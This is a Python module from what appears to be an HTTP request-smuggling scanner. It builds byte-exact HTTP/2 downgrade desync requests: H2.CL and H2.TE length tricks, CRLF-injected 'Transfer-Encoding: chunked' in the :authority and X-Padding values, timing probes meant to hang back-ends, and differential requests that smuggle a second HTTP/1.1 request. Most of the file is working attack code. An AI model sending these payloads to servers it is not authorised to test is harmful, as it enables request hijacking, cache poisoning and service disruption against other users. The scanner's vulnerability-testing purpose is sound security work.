"""HTTP/2-downgrade desync probe payloads: H2.CL, H2.TE, and H2.PseudoHdrInject.

When an HTTP/2 front-end forwards to an HTTP/1.1 back-end it *downgrades* -- it
rewrites the binary H2 request into an HTTP/1.1 message. The H2 message length is
implicit (it is the DATA-frame length / END_STREAM), so a correct front-end
ignores any ``content-length`` and never forwards a ``transfer-encoding`` (both
are prohibited in H2 by RFC 7540 sec 8.1.2). A *vulnerable* front-end instead
copies those headers through, and the downgraded HTTP/1.1 request then carries a
length signal the H2 layer never honoured -- so the H1 back-end frames the
message differently from the front-end. That is the desync.

Three technique classes, each a byte-exact :class:`~doppelganger.h2send.H2Request`
(the hand-rolled literal HPACK encoder carries prohibited framing verbatim):

* **H2.CL** -- inject a ``content-length`` that disagrees with the real
  DATA-frame length. The vulnerable front copies ``content-length`` into the H1
  request; the H1 back-end honours it.
    - *timing probe*: ``content-length`` LARGER than the body -> the back-end is
      left waiting for body bytes that (post-downgrade) never arrive -> hang.
    - *differential attack*: ``content-length: 0`` with a non-empty body -> the
      back-end reads a zero-length body and reinterprets the body as the next
      request (the smuggled prefix).

* **H2.TE** -- inject ``transfer-encoding: chunked`` (illegal in H2) as a
  regular header. The vulnerable front copies it through; the H1 back-end
  switches to chunked parsing while the front used the frame length.
    - *timing probe*: a chunk with no terminating ``0\\r\\n\\r\\n`` -> the
      back-end waits for the next chunk -> hang.
    - *differential attack*: body ``0\\r\\n\\r\\n`` + smuggled request -> the
      back-end stops at the chunk terminator, leaving the smuggled prefix.

* **H2.PseudoHdrInject** (v0.8) -- inject ``\\r\\nTransfer-Encoding: chunked``
  into a *value* (either the ``:authority`` pseudo-header or a regular header
  value).  A correct H2 stack would reject CRLF in a header value; a vulnerable
  front-end that naively copies decoded values into the downgraded H1 request
  produces an extra ``Transfer-Encoding: chunked`` line, creating the same
  length-framing desync as H2.TE but via a different injection vector.  Two
  variants probe distinct code paths:

    - ``authority-crlf-te``: CRLF in the ``:authority`` value -> the downgraded
      ``Host:`` header carries ``\\r\\nTransfer-Encoding: chunked`` (exploits
      the code path that copies authority into ``Host:``).
    - ``header-val-crlf-te``: CRLF in a regular header value (``X-Padding``) ->
      a downgrader that does not strip CRLF from non-pseudo headers injects TE
      into the H1 view.

Techniques implement James Kettle / PortSwigger's "HTTP/2: The Sequel is Always
Worse" -- no Burp/HRS code is vendored. These are request builders; response
bytes are handled elsewhere and treated as data (R5).
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from doppelganger.h2send import H2Request

__all__ = [
    "H2Technique",
    "H2_TECHNIQUES",
    "H2_DOWNGRADE_REFERENCES",
    "all_h2_techniques",
    "h2_technique_by_name",
]

# The H2-downgrade technique names doppelganger targets. These populate
# ``Finding.vector`` for H2 findings (kept separate from the pinned v0.1
# ``findings.TECHNIQUES`` H1 tuple).
# v0.8 adds "H2.PseudoHdrInject": CRLF injection into pseudo-header / header
# values to smuggle Transfer-Encoding: chunked through a vulnerable downgrader.
H2_TECHNIQUES: tuple[str, ...] = ("H2.CL", "H2.TE", "H2.PseudoHdrInject")

H2_DOWNGRADE_REFERENCES: tuple[str, ...] = (
    "https://portswigger.net/research/http2",
    "https://portswigger.net/web-security/request-smuggling/advanced",
)

# A content-length that is deliberately far larger than the body the timing
# probe actually sends, so the downgraded H1 back-end blocks waiting for bytes
# that never come.
_TIMING_CL = b"2048"
_TIMING_BODY = b"AB"

# An incomplete chunked body (a chunk announced, no terminating 0-chunk) so a
# chunked back-end hangs waiting for the next chunk.
_TIMING_CHUNK = b"400\r\nAB"

# CRLF suffix injected into a header value to produce a synthetic
# "Transfer-Encoding: chunked" line when a vulnerable H2->H1 downgrader copies
# the decoded value verbatim into the H1 representation.  RFC 9113 §8.2.1
# prohibits CR/LF in H2 header values; a correct implementation rejects the
# request before downgrading.  The literal-HPACK send layer (h2send) carries the
# bytes to the wire verbatim -- no validation, no stripping.
_INJECT_TE_SUFFIX: bytes = b"\r\nTransfer-Encoding: chunked"


def _smuggled_request(authority: str, marker_path: str) -> bytes:
    """A complete smuggled inner HTTP/1.1 request targeting the marker resource."""
    return (
        f"GET {marker_path} HTTP/1.1\r\n"
        f"Host: {authority}\r\n"
        f"X-Dg-H2-Smuggle: 1\r\n"
        f"\r\n"
    ).encode()


@dataclass(frozen=True, slots=True)
class H2Technique:
    """One H2-downgrade technique and its byte-exact H2 request builders.

    Attributes:
        name: The finding ``vector`` / discrepancy class (``"H2.CL"`` /
            ``"H2.TE"``).
        discrepancy: The ``X.Y`` discrepancy label (mirrors ``name``).
        safe_order: Lower is probed earlier. H2.CL (0) before H2.TE (1) -- the
            same safe-ordering principle as v0.1 (a chunked/TE hang is the more
            disruptive probe, so it goes last).
    """

    name: str
    discrepancy: str
    safe_order: int
    variant: str | None = None
    references: tuple[str, ...] = field(default=H2_DOWNGRADE_REFERENCES)

    def timing_request(self, authority: str, path: str, scheme: str = "https") -> "H2Request":
        """Byte-exact H2 timing probe -- crafted so a vulnerable downgrade hangs."""
        # Imported lazily so importing this module (e.g. for the CLI technique
        # list) does not pull the hpack/h2 stack -- H1-only usage stays light.
        from doppelganger.h2send import H2Request

        if self.name == "H2.CL":
            # content-length >> DATA length -> H1 back-end waits for more body.
            return H2Request(
                method=b"POST",
                path=path.encode(),
                authority=authority.encode(),
                scheme=scheme.encode(),
                headers=((b"content-length", _TIMING_CL),),
                body=_TIMING_BODY,
            )
        if self.name == "H2.TE":
            # transfer-encoding: chunked with an unterminated chunk -> back-end
            # blocks waiting for the next chunk.
            return H2Request(
                method=b"POST",
                path=path.encode(),
                authority=authority.encode(),
                scheme=scheme.encode(),
                headers=((b"transfer-encoding", b"chunked"),),
                body=_TIMING_CHUNK,
            )
        if self.name == "H2.PseudoHdrInject":
            # Inject \r\nTransfer-Encoding: chunked into a header value.  A
            # vulnerable H2->H1 downgrader that copies decoded values verbatim
            # will produce an extra TE header in the H1 view; the H1 back-end
            # switches to chunked parsing and hangs on the unterminated chunk.
            if self.variant == "authority-crlf-te":
                # Inject via the :authority pseudo-header value -> the downgraded
                # Host: line carries the CRLF, injecting TE after it.
                return H2Request(
                    method=b"POST",
                    path=path.encode(),
                    authority=authority.encode() + _INJECT_TE_SUFFIX,
                    scheme=scheme.encode(),
                    body=_TIMING_CHUNK,
                )
            if self.variant == "header-val-crlf-te":
                # Inject via a regular header value (X-Padding) -> a downgrader
                # that does not strip CRLF from non-pseudo header values injects
                # Transfer-Encoding: chunked into the H1 view.
                return H2Request(
                    method=b"POST",
                    path=path.encode(),
                    authority=authority.encode(),
                    scheme=scheme.encode(),
                    headers=((b"x-padding", b"x" + _INJECT_TE_SUFFIX),),
                    body=_TIMING_CHUNK,
                )
            raise ValueError(f"unknown H2.PseudoHdrInject variant {self.variant!r}")
        raise ValueError(f"unknown H2 technique {self.name!r}")

    def differential_request(
        self, authority: str, marker_path: str, path: str, scheme: str = "https"
    ) -> "H2Request":
        """Byte-exact H2 smuggling attack whose leftover requests ``marker_path``."""
        from doppelganger.h2send import H2Request

        smuggled = _smuggled_request(authority, marker_path)
        if self.name == "H2.CL":
            # content-length: 0 but a non-empty body -> the H1 back-end reads a
            # zero-length body and reinterprets the body as the smuggled request.
            return H2Request(
                method=b"POST",
                path=path.encode(),
                authority=authority.encode(),
                scheme=scheme.encode(),
                headers=((b"content-length", b"0"),),
                body=smuggled,
            )
        if self.name == "H2.TE":
            # transfer-encoding: chunked; body terminates the chunked stream
            # early, leaving the smuggled request as a prefix for the back-end.
            body = b"0\r\n\r\n" + smuggled
            return H2Request(
                method=b"POST",
                path=path.encode(),
                authority=authority.encode(),
                scheme=scheme.encode(),
                headers=((b"transfer-encoding", b"chunked"),),
                body=body,
            )
        if self.name == "H2.PseudoHdrInject":
            # Same desync shape as H2.TE (chunk terminator + smuggled prefix)
            # but the Transfer-Encoding: chunked is injected via CRLF in a
            # header value, not as a prohibited H2 regular header.
            body = b"0\r\n\r\n" + smuggled
            if self.variant == "authority-crlf-te":
                return H2Request(
                    method=b"POST",
                    path=path.encode(),
                    authority=authority.encode() + _INJECT_TE_SUFFIX,
                    scheme=scheme.encode(),
                    body=body,
                )
            if self.variant == "header-val-crlf-te":
                return H2Request(
                    method=b"POST",
                    path=path.encode(),
                    authority=authority.encode(),
                    scheme=scheme.encode(),
                    headers=((b"x-padding", b"x" + _INJECT_TE_SUFFIX),),
                    body=body,
                )
            raise ValueError(f"unknown H2.PseudoHdrInject variant {self.variant!r}")
        raise ValueError(f"unknown H2 technique {self.name!r}")


def all_h2_techniques() -> list[H2Technique]:
    """Every H2-downgrade technique, in safe probe order.

    Order: H2.CL (0) -> H2.TE (1) -> H2.PseudoHdrInject variants (2).

    H2.CL before H2.TE -- the same safe-ordering principle as v0.1 (a chunked/TE
    hang is the more disruptive probe, so it goes last among same-class probes).
    H2.PseudoHdrInject after both: it also produces a TE-style hang, and is
    probed after the canonical H2.CL/H2.TE tests.
    """
    techs = [
        H2Technique("H2.CL", "H2.CL", safe_order=0),
        H2Technique("H2.TE", "H2.TE", safe_order=1),
        # v0.8: CRLF-injection into :authority pseudo-header value.
        H2Technique(
            "H2.PseudoHdrInject",
            "H2.PseudoHdrInject",
            safe_order=2,
            variant="authority-crlf-te",
        ),
        # v0.8: CRLF-injection into a regular header value (X-Padding).
        H2Technique(
            "H2.PseudoHdrInject",
            "H2.PseudoHdrInject",
            safe_order=2,
            variant="header-val-crlf-te",
        ),
    ]
    return sorted(techs, key=lambda t: t.safe_order)


def h2_technique_by_name(name: str) -> list[H2Technique]:
    """Return the H2 technique(s) matching ``name``."""
    return [t for t in all_h2_techniques() if t.name == name]
